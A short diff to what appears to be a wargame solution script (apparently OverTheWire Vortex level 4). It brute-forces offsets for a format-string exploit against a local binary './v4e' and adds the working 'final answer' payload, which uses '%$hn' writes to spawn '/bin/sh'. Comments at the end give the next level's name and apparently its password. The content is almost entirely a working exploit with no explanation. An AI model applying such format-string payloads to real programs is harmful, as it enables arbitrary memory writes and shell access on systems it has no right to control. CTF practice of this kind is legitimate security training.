@@ -54,5 +54,8 @@ for i in xrange(95, 105):
         os.system("./v4e '/bin/sh && ls %02038x%"+str(i+1)+"$hn%09420x%"+str(i+2)+"$hn%022424x%"+str(i)+"$hn%029566x%"+str(i+3)+"$naa'")
         print i
 
+final answer:
+./v4e '/bin/sh && ls %02038x%97$hn%09420x%98$hn%022424x%96$hn%029566x%99$naa'
+
 #vortex5
 #:4VtbC4lr
